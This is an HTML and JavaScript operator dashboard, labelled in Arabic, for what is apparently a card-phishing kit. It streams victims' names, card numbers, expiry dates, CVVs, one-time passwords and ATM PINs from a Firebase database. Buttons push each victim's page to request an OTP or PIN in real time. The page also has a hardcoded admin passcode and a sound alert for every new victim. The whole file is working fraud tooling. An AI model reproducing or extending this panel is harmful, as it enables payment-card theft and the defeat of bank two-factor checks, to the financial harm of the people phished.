<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>رادار العمليات - System-Cloud-V3</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .header { background: #006C35; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 10px; z-index: 1000; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .card { background: white; padding: 15px; margin-bottom: 12px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #006C35; display: grid; grid-template-columns: 2fr 2.5fr 1.5fr 1fr; gap: 15px; align-items: center; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        .data-val { font-weight: bold; color: #333; display: block; font-size: 15px; }
        .card-no { font-family: monospace; color: #d9534f; font-size: 19px; background: #fff5f5; padding: 5px; border-radius: 5px; border: 1px solid #ffcccc; text-align: center; }
        .btn-action { padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-otp { background: #28a745; color: white; }
        .btn-pin { background: #ffc107; color: black; }
        .btn-del { background: #333; color: white; }
        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; }
        .p-in { padding: 15px; border-radius: 10px; border: 1px solid #00ff88; margin-top: 20px; text-align: center; width: 280px; background: #000; color: #00ff88; font-size: 22px; letter-spacing: 4px; }
    </style>
</head>
<body>

<div id="l-scr">
    <h2 style="color: #00ff88">ADMIN ACCESS</h2>
    <p>ادخل كود الوصول الخاص بك يا بشمهندس</p>
    <input type="password" class="p-in" id="p-key" placeholder="••••••••" oninput="_v_auth(this.value)">
</div>

<audio id="alert-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div class="header">
    <div><strong>لوحة التحكم اللحظية</strong> | <span id="online-now">0</span> زوار نشطين</div>
    <div style="font-size: 13px; color: #00ff88;">المشروع: System-Cloud-V3</div>
</div>

<div id="logs-list">
    </div>

<script>
    // بيانات الفايربيس الجديدة من الصورة التي أرسلتها
    const firebaseConfig = {
        apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
        authDomain: "system-cloud-v3.firebaseapp.com",
        databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com",
        projectId: "system-cloud-v3",
        storageBucket: "system-cloud-v3.firebasestorage.app",
        messagingSenderId: "48216753818",
        appId: "1:48216753818:web:ef537a31f36a08dffc4123",
        measurementId: "G-37QCY6F0Q7"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function _v_auth(v) {
        if(v === "H1234567890H") { 
            document.getElementById('l-scr').style.display = 'none';
        }
    }

    const logsList = document.getElementById('logs-list');
    const alertSound = document.getElementById('alert-sound');

    function renderCard(id, data) {
        let existingCard = document.getElementById('card-' + id);
        const cardInfo = data.card_details || {};
        const userInfo = data.personal_info || {};
        
        const cardHTML = `
            <div>
                <span style="font-size: 10px; color: #888;">العميل</span>
                <span class="data-val">${userInfo.fullName || 'جاري الإدخال...'}</span>
                <span style="font-size: 11px; color: #006C35;">📍 ${data.current_page || 'Index'}</span>
            </div>
            <div>
                <span style="font-size: 10px; color: #888;">بيانات البطاقة</span>
                <span class="card-no">${cardInfo.cardNumber || '**** **** **** ****'}</span>
                <small>EXP: ${cardInfo.expiry || '--/--'} | CVV: ${cardInfo.cvv || '***'}</small>
            </div>
            <div style="text-align: center; border-left: 1px solid #eee; border-right: 1px solid #eee;">
                <span class="data-val" style="color: blue; font-size: 20px;">OTP: ${cardInfo.otp || '----'}</span>
                <span class="data-val" style="color: red;">PIN: ${cardInfo.atm_pin || '----'}</span>
            </div>
            <div style="display: flex; flex-direction: column; gap: 5px;">
                <button class="btn-action btn-otp" onclick="sendCmd('${id}', 'go_to_otp')">طلب OTP</button>
                <button class="btn-action btn-pin" onclick="sendCmd('${id}', 'go_to_pin')">طلب PIN</button>
                <button class="btn-action btn-del" onclick="deleteRec('${id}')">حذف</button>
            </div>
        `;

        if (existingCard) {
            existingCard.innerHTML = cardHTML;
            existingCard.style.borderRightColor = "#ffc107";
            setTimeout(() => existingCard.style.borderRightColor = "#006C35", 1500);
        } else {
            const newCard = document.createElement('div');
            newCard.id = 'card-' + id;
            newCard.className = 'card';
            newCard.innerHTML = cardHTML;
            logsList.insertBefore(newCard, logsList.firstChild);
            alertSound.play().catch(e=>{});
        }
    }

    // مراقبة شاملة لكل البيانات (جديد وتحديث)
    db.ref('orders').on('child_added', (snapshot) => renderCard(snapshot.key, snapshot.val()));
    db.ref('orders').on('child_changed', (snapshot) => renderCard(snapshot.key, snapshot.val()));
    db.ref('orders').on('child_removed', (snapshot) => {
        const el = document.getElementById('card-' + snapshot.key);
        if (el) el.remove();
    });

    function sendCmd(id, step) {
        db.ref('orders/' + id).update({ next_step: step, last_action: Date.now() });
    }

    function deleteRec(id) {
        if(confirm('حذف السجل؟')) db.ref('orders/' + id).remove();
    }

    db.ref('live_sessions').on('value', (s) => {
        let c = 0; s.forEach(x => { if(Date.now() - x.val().last_seen < 30000) c++; });
        document.getElementById('online-now').innerText = c;
    });
</script>
</body>
</html>
